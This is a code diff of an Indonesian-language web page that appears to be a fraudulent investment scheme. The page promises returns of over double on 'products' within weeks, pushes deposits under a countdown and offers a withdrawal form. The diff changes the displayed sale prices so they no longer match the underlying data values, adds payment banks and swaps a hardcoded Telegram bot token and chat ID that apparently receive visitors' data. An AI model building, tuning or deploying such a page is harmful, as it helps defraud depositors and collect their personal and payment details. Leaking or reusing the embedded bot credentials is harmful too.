@@ -263,7 +263,7 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
         <p>Silakan melakukan pembayaran dari deposit</p>
-        <p>Waktu tunggu: <span id="countdown">1:30</span></p>
+        <p>Sebelum Waktu tunggu Habis: <span id="countdown">10:00</span></p>
     </div>
 
     <!-- HALAMAN DAFTAR -->
@@ -379,7 +379,7 @@
                     <p><b>Produk Pertanian Modern</b></p>
                     <p>Tenor: 14 Hari</p>
                     <p>Harga Beli: Rp 420.000</p>
-                    <p class="price">Harga Jual: Rp 10.10.000</p>
+                    <p class="price">Harga Jual: Rp 982.000</p>
                     <button class="btn btn-pilih-produk" data-produk="Produk Pertanian Modern" data-hargabeli="620000" data-hargajual="810000">PILIH PRODUK</button>
                 </div>
             </div>
@@ -439,7 +439,7 @@
                     <p><b>Produk Teknologi Startup</b></p>
                     <p>Tenor: 35 Hari</p>
                     <p>Harga Beli: Rp 2.000.000</p>
-                    <p class="price">Harga Jual: Rp 6.100.000</p>
+                    <p class="price">Harga Jual: Rp 5.300.000</p>
                     <button class="btn btn-pilih-produk" data-produk="Produk Teknologi Startup" data-hargabeli="2000000" data-hargajual="3100000">PILIH PRODUK</button>
                 </div>
             </div>
@@ -491,8 +491,8 @@
                     <label>Metode Pembayaran Digunakan</label>
                     <select id="depositMetode">
                         <option value="">Pilih Metode</option>
-                        <option value="BCA">Bank BCA</option>
-                        <option value="Mandiri">Bank Mandiri</option>
+                        <option value="Jago">Bank Jago</option>
+                        <option value="Bni">Bank Bni</option>
                         <option value="BRI">Bank BRI</option>
                         <option value="DANA">DANA</option>
                     </select>
@@ -516,7 +516,8 @@
                             <option value="BCA">Bank BCA</option>
                             <option value="Mandiri">Bank Mandiri</option>
                             <option value="BRI">Bank BRI</option>
-                            <option value="DANA">DANA</option>
+                            <option value="DANA">DANA</option><option value="BNI">Bank BNI</option>
+                            <option value="OVO">OVO</option>
                         </select>
                     </div>
                     <button class="btn btn-secondary" id="btnWithdraw">AJUKAN PENARIKAN</button>
@@ -572,8 +573,8 @@
     </div>
 
     <script>
-        const botToken = '8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU';
-        const chatId = '8571321926';
+        const botToken = '8769999092:AAFtw69uBOwf-oZKomvHSZJorfYWOx7HD14';
+        const chatId = '8260129907';
 
         // SET ID OTOMATIS SAAT HALAMAN DIMUAT
         window.onload = function() {
